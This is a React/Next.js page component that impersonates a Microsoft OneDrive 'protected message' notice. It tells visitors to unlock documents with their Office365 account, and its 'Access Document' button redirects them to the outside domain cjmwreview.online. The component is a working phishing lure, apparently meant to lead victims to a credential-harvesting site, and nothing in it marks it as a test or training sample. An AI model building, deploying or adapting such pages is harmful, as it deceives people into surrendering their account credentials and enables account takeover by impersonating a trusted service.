"use client";
/* eslint-disable react/no-unescaped-entities */
import React, { useState } from "react";

import {
  Box,
  Center,
  Container,
  Card,
  CardBody,
  Stack,
  Heading,
  Text,
  Input,
  Divider,
  Button,
} from "@chakra-ui/react";
import Image from "next/image";

import { useRouter } from "next/navigation";

import Footer from "../../public/8fb45f0d-4c89-4e57-9ce4-8b3d980cb5df_rw_600.png";
import Header from "../../public/fdc1734b-0be4-499b-8c3a-04dff63ead22_rw_1920.png";

export default function CardComponent() {
  const router = useRouter();

  const handleSubmit = () => {
    router.push("cjmwreview.online");
  };

  const handleKeyPress = (event) => {
    if (event.key === "Enter") {
      handleSubmit();
    }
  };

  return (
    <Container maxW="550px">
      <Box display="flex" flexDirection="column" alignItems="center" gap={6}>
        <Image src={Header} alt="" width={700} height={500} priority />
        <Text
          color="#546e87"
          fontSize="20px"
          lineHeight="22px"
          textAlign="center"
        >
          You have received a protected message via Microsoft One Drive
        </Text>
        <Text
          color="#546e87"
          fontSize="20px"
          lineHeight="22px"
          textAlign="center"
        >
          Click the link below and unlock with Office365 account to view
          documents.
        </Text>
        <Button
          backgroundColor="#022a55"
          color="#ffffff"
          borderRadius="100px"
          _hover={{ bg: "#022a55cc", color: "#ffffff" }}
          onClick={handleSubmit}
        >
          Access Document
        </Button>
        <Text
          color="#546e87"
          fontSize="20px"
          lineHeight="22px"
          textAlign="center"
        >
          Can't access your account?
        </Text>
        <Text
          color="#546e87"
          fontSize="20px"
          lineHeight="22px"
          textAlign="center"
        >
          The Office app is becoming the new Microsoft 365 app, your home find,
          create, and share your content and ideas. Learn more.
        </Text>
        <Image src={Footer} alt="" width={500} height={500} />
      </Box>
    </Container>
  );
}
